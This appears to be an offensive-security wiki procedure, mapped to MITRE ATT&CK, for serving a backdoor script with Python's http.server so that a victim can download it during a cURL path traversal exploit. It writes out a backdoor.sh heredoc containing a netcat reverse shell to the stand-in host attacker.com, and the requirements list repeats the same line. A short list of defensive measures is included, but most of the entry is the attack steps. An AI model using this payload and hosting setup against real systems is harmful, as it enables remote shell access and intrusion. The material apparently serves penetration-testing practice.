---
tags:
  - payload-hosting
  - http-server
type: procedure
tools:
  - '[[tools/Python]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/python3-http-server]]'
verified: false
platforms:
  - Linux
  - macOS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:26:12.487Z'
skill_level: beginner
impact_level: low
detection_risk: low
sub_techniques: []
id: 14f5a9b4-27b9-4bff-b40e-e55a1a52f219
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Host-Malicious-Payload-with-Python-Server

## Summary

This procedure sets up a simple local HTTP server using Python's built-in module to host a malicious backdoor script, simulating an attacker-controlled endpoint for cURL exploitation testing.

## Description

In the attack scenario, an attacker hosts a backdoor.sh script (e.g., containing reverse shell code) in a directory and starts a Python HTTP server on port 8000. This allows cURL to download the file during path traversal exploitation. Prerequisites include Python 3 installed and the backdoor.sh file in the current directory. Expected outcome: Server serves files accessible via http://localhost:8000/backdoor.sh, enabling subsequent download and write.

## Requirements

1. Python 3 installed on the system
2. backdoor.sh file created in the working directory (e.g., #!/bin/bash
nc -e /bin/sh attacker.com 4444)
3. Port 8000 available (no firewall blocks)

## Defense

Defensive measures and detection strategies:

- Monitor for unexpected HTTP servers on non-standard ports using netstat or firewall logs
- Block outbound connections to suspicious local endpoints in controlled environments
- Use application whitelisting to restrict Python script execution

## Objectives

1. Host malicious payload for download
2. Simulate remote attacker server locally for testing
3. Enable cURL-based file retrieval in exploitation chain

## Instructions

### Step 1: Prepare Payload Directory

**Context**: Ensure the backdoor.sh is in the current directory to be served.

Create or verify backdoor.sh:

```bash
cat > backdoor.sh << EOF
#!/bin/bash
echo "Backdoor executed" > /tmp/backdoor.log
nc -e /bin/sh attacker.com 4444
EOF
chmod +x backdoor.sh
```

> This creates an executable script that logs execution and attempts a reverse shell.

### Step 2: Start HTTP Server

**Context**: Launch the server to host the file on port 8000.

**Command** ([[commands/python3-http-server]]):

```bash
python3 -m http.server 8000
```

> Starts the server; access files via browser or cURL at http://localhost:8000/. Expected output: "Serving HTTP on 0.0.0.0 port 8000 ..." Press Ctrl+C to stop.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used

- [[commands/python3-http-server]]

## Tools Used

- [[tools/Python]]

## Tags

- payload-hosting
- http-server
